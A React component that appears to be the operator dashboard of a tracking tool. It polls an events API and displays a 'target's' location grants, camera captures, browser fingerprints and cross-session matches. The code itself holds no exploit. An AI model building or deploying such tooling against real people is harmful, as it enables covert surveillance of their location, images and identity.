import { api, Template } from '../api/client'
import { useEffect, useState } from 'react'

interface EventRow {
  id: string
  session_id: string
  event_type: string
  event_data: any
  created_at: number
}

export default function SessionReplay() {
  const [events, setEvents] = useState<EventRow[]>([])
  const [loading, setLoading] = useState(true)

  const refresh = async () => {
    try {
      const r = await fetch('/api/events?session=default')
      setEvents(await r.json())
    } catch (e) { console.error(e) }
    finally { setLoading(false) }
  }

  useEffect(() => {
    refresh()
    const t = setInterval(refresh, 3000)
    return () => clearInterval(t)
  }, [])

  const icon = (type: string) => {
    const map: Record<string, string> = {
      page_visit: '🌐', location_granted: '📍', location_denied: '🚫',
      camera_capture: '📸', fingerprint_collected: '🔍',
      cross_session_match: '🔗', camera_granted: '📷', camera_denied: '🚫',
    }
    return map[type] || '⚡'
  }

  if (loading) return <div className="text-gray-500">Loading...</div>

  return (
    <div>
      <h2 className="text-xl font-bold text-white mb-6">Session Replay ({events.length} events)</h2>
      <div className="bg-gray-900 border border-gray-800 rounded-xl p-4 max-h-[70vh] overflow-y-auto">
        {events.length === 0 ? (
          <div className="text-center py-12 text-gray-600">
            <div className="text-4xl mb-2 opacity-30">⚡</div>
            <p>No events yet. Events appear as the target interacts with the page.</p>
          </div>
        ) : (
          <div className="space-y-1">
            {events.map((e, i) => (
              <div key={e.id} className="flex items-center gap-3 py-2 border-b border-gray-800/50 text-sm animate-[slideIn_0.3s_ease]">
                <span className="text-lg">{icon(e.event_type)}</span>
                <span className="text-gray-300 font-medium">{e.event_type.replace(/_/g, ' ')}</span>
                {e.event_data && (
                  <span className="text-xs text-gray-600 font-mono">
                    {typeof e.event_data === 'object' ? JSON.stringify(e.event_data).substring(0, 80) : e.event_data}
                  </span>
                )}
                <span className="text-xs text-gray-600 ml-auto">{new Date(e.created_at * 1000).toLocaleTimeString()}</span>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  )
}
